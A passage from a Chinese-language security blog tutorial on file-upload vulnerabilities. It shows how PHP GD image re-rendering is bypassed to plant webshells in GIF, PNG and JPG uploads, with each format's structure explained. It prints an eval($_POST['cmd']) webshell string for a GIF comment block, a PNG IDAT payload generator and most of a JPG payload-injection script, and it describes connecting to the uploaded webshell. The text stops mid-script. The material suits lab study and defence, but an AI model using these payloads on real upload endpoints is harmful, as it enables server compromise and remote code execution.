class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到源码gif、png、jpg格式图片都能上传，但处理方式有些差异。</p>
<p>因为后端是php处理的，对不同格式图片php函数处理方式不同。</p>
<h4 id="GIF图片文件"><a href="#GIF图片文件" class="headerlink" title="GIF图片文件"></a>GIF图片文件</h4><p>使用到GD库的<code>imagecreatefromgif() </code>和 <code>imagegif()</code>函数的二次渲染机制。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GD库对gif图片处理流程：</span><br><span class="line"><span class="comment">// 读取流程</span></span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="string">&quot;input.gif&quot;</span>);</span><br><span class="line"><span class="comment">// GD实际行为：</span></span><br><span class="line"><span class="comment">// 1. 解析GIF头部和逻辑屏幕描述符</span></span><br><span class="line"><span class="comment">// 2. 解析全局颜色表（如果有）</span></span><br><span class="line"><span class="comment">// 3. 遍历数据块：</span></span><br><span class="line"><span class="comment">//    - 如果是图形控制扩展(0x21F9)→保留</span></span><br><span class="line"><span class="comment">//    - 如果是注释扩展(0x21FE)→忽略不处理！</span></span><br><span class="line"><span class="comment">//    - 如果是应用程序扩展(0x21FF)→部分保留（如动画信息）</span></span><br><span class="line"><span class="comment">//    - 如果是图像描述符→解码LZW数据</span></span><br><span class="line"><span class="comment">// 4. 仅将图像数据加载到内存资源中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入流程</span></span><br><span class="line"><span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>, <span class="string">&quot;output.gif&quot;</span>);</span><br><span class="line"><span class="comment">// GD实际行为：</span></span><br><span class="line"><span class="comment">// 1. 生成标准的GIF89a头部</span></span><br><span class="line"><span class="comment">// 2. 写入逻辑屏幕描述符（基于内存图像）</span></span><br><span class="line"><span class="comment">// 3. 如果原图有全局颜色表→可能重新生成</span></span><br><span class="line"><span class="comment">// 4. 写入图形控制扩展（如有需要）</span></span><br><span class="line"><span class="comment">// 5. 写入图像描述符</span></span><br><span class="line"><span class="comment">// 6. 将内存图像重新编码为LZW数据</span></span><br><span class="line"><span class="comment">// 7. 写入文件结束符</span></span><br><span class="line"><span class="comment">// 注意：不会写入原图的注释扩展！</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gif图片构成：</span><br><span class="line">GIF89a头 (6字节)</span><br><span class="line">逻辑屏幕描述符 (7字节)</span><br><span class="line">全局颜色表 (可选)</span><br><span class="line">扩展块:</span><br><span class="line">  图形控制扩展 (0x21 0xF9)</span><br><span class="line">  注释扩展 (0x21 0xFE) ← 可插入木马</span><br><span class="line">  应用程序扩展 (0x21 0xFF)</span><br><span class="line">图像描述符 (10字节)</span><br><span class="line">图像数据 (LZW压缩)</span><br><span class="line">更多帧（如果是动画GIF）</span><br><span class="line">文件结束符 (0x3B)</span><br></pre></td></tr></table></figure>

<p>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假设攻击者构造的恶意GIF结构：</span></span><br><span class="line"><span class="variable">$malicious_gif</span> = [</span><br><span class="line">    <span class="string">&quot;GIF89a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;逻辑屏幕描述符&quot;</span>,</span><br><span class="line">    <span class="string">&quot;全局颜色表&quot;</span>,</span><br><span class="line">    <span class="string">&quot;注释扩展块(包含&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]); ?&gt;)&quot;</span>,  <span class="comment">// ← GD会忽略这个块！</span></span><br><span class="line">    <span class="string">&quot;图像描述符&quot;</span>,</span><br><span class="line">    <span class="string">&quot;图像数据(LZW压缩)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;文件结束符&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// GD库读取时：</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$malicious_gif</span>);  <span class="comment">// ← 忽略注释块，只解析图像数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GD库写入时：</span></span><br><span class="line"><span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>, <span class="variable">$output_path</span>);  <span class="comment">// ← 从内存图像重新生成，不会包含原注释块</span></span><br><span class="line"></span><br><span class="line">按照这个思路，我们就可以将图片上传后下载下来与原图对比，找到相同的地方也就是注释块位置，插入我们的恶意代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%201221.png" alt=" "></p>
<p>将插入后的图片再上传</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1221212.png" alt=" "></p>
<p>再将第二次插入后的木马上传后的图片下载打开</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/999.png" alt=" "></p>
<p>可以看到带有后门的图片马成功上传了，后面webshell连接即可。</p>
<h4 id="PNG图片文件"><a href="#PNG图片文件" class="headerlink" title="PNG图片文件"></a><strong>PNG图片文件</strong></h4><p>先来看看png图片文件组成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG签名 (8字节: 89 50 4E 47 0D 0A 1A 0A)</span><br><span class="line">数据块序列：</span><br><span class="line">  IHDR块 (图像头部) - 必选</span><br><span class="line">  PLTE块 (调色板) - 可选</span><br><span class="line">  IDAT块 (图像数据) - 必选，可多个</span><br><span class="line">  IEND块 (图像结束) - 必选</span><br><span class="line">可选辅助块：</span><br><span class="line">  tEXt - 文本数据</span><br><span class="line">  zTXt - 压缩文本</span><br><span class="line">  iTXt - 国际文本</span><br><span class="line">  gAMA - 伽玛值</span><br><span class="line">  tRNS - 透明度</span><br><span class="line">  pHYs - 物理像素尺寸</span><br></pre></td></tr></table></figure>

<h5 id="PNG签名"><a href="#PNG签名" class="headerlink" title="PNG签名"></a>PNG签名</h5><p>每种格式图片的16进制数据是固定的，不同格式图片不一样，所以判断一个文件mimetype类型，更重要的是在<code>签名</code>而不是文件<code>后缀名</code>。</p>
<p>签名就讲这么多，重点在三个必选的数据块里。</p>
<h5 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a>数据块</h5><p>png文件里数据块的构成</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Length (长度)</td>
<td>4字节</td>
<td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td>
</tr>
<tr>
<td>Chunk Type Code (数据块类型码)</td>
<td>4字节</td>
<td>数据块类型码由ASCII字母(A-Z和a-z)组成的“数据块符号”</td>
</tr>
<tr>
<td>Chunk Data (数据块数据)</td>
<td>可变长度</td>
<td>存储按照Chunk Type Code指定的数据</td>
</tr>
<tr>
<td>CRC (循环冗余检测)</td>
<td>4字节</td>
<td>存储用来检测是否有错误的循环冗余码</td>
</tr>
</tbody></table>
<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
<p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
<p>CRC: 一种<strong>校验算法</strong>。仅仅用来校验数据的正确性的，这里因为使用了4个字节，说明使用的是CRC32标准算法。</p>
<h6 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h6><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
<table>
<thead>
<tr>
<th><strong>域的名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Width</td>
<td>4 bytes</td>
<td>图像宽度，以像素为单位</td>
</tr>
<tr>
<td>Height</td>
<td>4 bytes</td>
<td>图像高度，以像素为单位</td>
</tr>
<tr>
<td>Bit depth</td>
<td>1 bytes</td>
<td>图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16</td>
</tr>
<tr>
<td>ColorType</td>
<td>1 bytes</td>
<td>颜色类型：0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16</td>
</tr>
<tr>
<td>Compression method</td>
<td>1 bytes</td>
<td>压缩方法(LZ77派生算法)</td>
</tr>
<tr>
<td>Filter method</td>
<td>1 bytes</td>
<td>滤波器方法</td>
</tr>
<tr>
<td>Interlace method</td>
<td>1 bytes</td>
<td>隔行扫描方法：0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
</tr>
</tbody></table>
<h6 id="PLTE数据块"><a href="#PLTE数据块" class="headerlink" title="PLTE数据块"></a>PLTE数据块</h6><p>调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。</p>
<p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成：</p>
<table>
<thead>
<tr>
<th><strong>颜色</strong></th>
<th><strong>字节</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Red</td>
<td>1 byte</td>
<td>0 &#x3D; 黑色, 255 &#x3D; 红</td>
</tr>
<tr>
<td>Green</td>
<td>1 byte</td>
<td>0 &#x3D; 黑色, 255 &#x3D; 绿色</td>
</tr>
<tr>
<td>Blue</td>
<td>1 byte</td>
<td>0 &#x3D; 黑色, 255 &#x3D; 蓝色</td>
</tr>
</tbody></table>
<p>因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p>
<h6 id="IDAT数据块"><a href="#IDAT数据块" class="headerlink" title="IDAT数据块"></a>IDAT数据块</h6><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p>
<h6 id="IEND数据块"><a href="#IEND数据块" class="headerlink" title="IEND数据块"></a>IEND数据块</h6><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
<p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>将恶意代码写入IDAT数据块</p>
<p>pyload如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义颜色数据数组</span></span><br><span class="line"><span class="variable">$colorData</span> = [</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建32x32真彩色图像</span></span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dataLength</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$colorData</span>);</span><br><span class="line"><span class="variable">$pixelCount</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历颜色数据，每3个字节创建一个像素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$dataLength</span>; <span class="variable">$i</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="comment">// 确保有足够的数据创建RGB颜色</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> + <span class="number">2</span> &lt; <span class="variable">$dataLength</span>) &#123;</span><br><span class="line">        <span class="variable">$red</span> = <span class="variable">$colorData</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$green</span> = <span class="variable">$colorData</span>[<span class="variable">$i</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="variable">$blue</span> = <span class="variable">$colorData</span>[<span class="variable">$i</span> + <span class="number">2</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分配颜色</span></span><br><span class="line">        <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>, <span class="variable">$red</span>, <span class="variable">$green</span>, <span class="variable">$blue</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算x坐标（每3个字节一个像素）</span></span><br><span class="line">        <span class="variable">$x</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$pixelCount</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在图像上设置像素（y坐标始终为0）</span></span><br><span class="line">        <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$image</span>, <span class="variable">$x</span>, <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">        <span class="variable">$pixelCount</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outputPath</span> = <span class="string">&#x27;./1.png&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用010看下文件数据</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/111.png" alt=" "></p>
<p>将上传成功后的图片下载看下数据</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20251210220021_19_3.jpg" alt=" "></p>
<p>成功将带有后门的png图片上传到服务器。</p>
<h4 id="JPG图片文件"><a href="#JPG图片文件" class="headerlink" title="JPG图片文件"></a>JPG图片文件</h4><h5 id="JPG图片构成"><a href="#JPG图片构成" class="headerlink" title="JPG图片构成"></a>JPG图片构成</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFD8 (SOI - 图像开始)</span><br><span class="line">├── FFE0 (APP0 - JFIF应用段)</span><br><span class="line">├── FFDB (DQT - 量化表)</span><br><span class="line">├── FFC0 (SOF0 - 帧开始)</span><br><span class="line">├── FFC4 (DHT - 哈夫曼表)</span><br><span class="line">├── FFDA (SOS - 扫描开始)</span><br><span class="line">│   └── 压缩的图像数据</span><br><span class="line">└── FFD9 (EOI - 图像结束)</span><br></pre></td></tr></table></figure>

<p>由于篇幅太大这里只详细介绍重要的部分</p>
<p><strong>SOS（扫描行开始）</strong></p>
<ul>
<li><strong>标记码</strong>：<code>DA</code>；</li>
<li><strong>核心作用</strong>：标识压缩图像数据的起始，关联Huffman表与颜色组件；</li>
<li><strong>详细结构</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>段标识</td>
<td>1</td>
<td>FF</td>
</tr>
<tr>
<td>段类型</td>
<td>1</td>
<td>DA</td>
</tr>
<tr>
<td>段长度</td>
<td>2</td>
<td><code>6 + 2×组件数量</code>（如3个组件时为<code>00 0C</code>&#x3D;12字节）</td>
</tr>
<tr>
<td>组件数量</td>
<td>1</td>
<td>通常为3（YCbCr彩色图），1~4之间</td>
</tr>
<tr>
<td>组件ID</td>
<td>1</td>
<td>1&#x3D;Y，2&#x3D;Cb，3&#x3D;Cr</td>
</tr>
<tr>
<td>Huffman表号</td>
<td>1</td>
<td>0-3位&#x3D;AC表号，4-7位&#x3D;DC表号（如<code>00</code>&#x3D;AC表0、DC表0）</td>
</tr>
<tr>
<td>剩余3字节</td>
<td>3</td>
<td>用途不明，解码时可忽略</td>
</tr>
</tbody></table>
<ul>
<li><strong>关键</strong>：SOS段后直接跟随压缩的图像数据（扫描行数据），按“左到右、上到下”顺序存储。</li>
</ul>
<p><strong>EOI（文件尾）</strong></p>
<ul>
<li><strong>标记码</strong>：<code>D9</code>；</li>
<li><strong>结构</strong>：仅2字节，无长度和内容；</li>
<li><strong>数据</strong>：<code>FF D9</code>（JPEG文件的结束标识，不可缺少）；</li>
<li><strong>示例</strong>：二进制文件末尾必为<code>FF D9</code>，对应十六进制<code>00007bf0h: ... FF D9</code>。</li>
</ul>
<p>php后端对jpg图片的处理过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// GD处理JPEG的过程</span><br><span class="line">$im = imagecreatefromjpeg($file);</span><br><span class="line">// 内部操作：</span><br><span class="line">// 1. 解析所有JPEG段</span><br><span class="line">// 2. 解压缩DCT系数</span><br><span class="line">// 3. 反量化</span><br><span class="line">// 4. 反离散余弦变换</span><br><span class="line">// 5. 得到RGB像素数据（完全解码）</span><br><span class="line"></span><br><span class="line">imagejpeg($im, $output);</span><br><span class="line">// 内部操作：</span><br><span class="line">// 1. 将RGB转换为YCbCr</span><br><span class="line">// 2. 离散余弦变换</span><br><span class="line">// 3. 使用默认量化表重新量化</span><br><span class="line">// 4. 使用默认哈夫曼表重新编码</span><br><span class="line">// 5. 生成全新的JPEG文件</span><br></pre></td></tr></table></figure>

<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><p><code>imagecopyresized()</code>和<code>imagecopyresampled()</code>等函数在重新采样图像时：</p>
<p>不完全重建JPEG流：可能保留部分原始压缩数据。</p>
<p>不重新编码所有扫描数据：特别是DC系数可能被保留。</p>
<p>容忍某些不规范数据：如果数据不影响图像显示，可能被原样复制。</p>
<p>基于此可以利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span 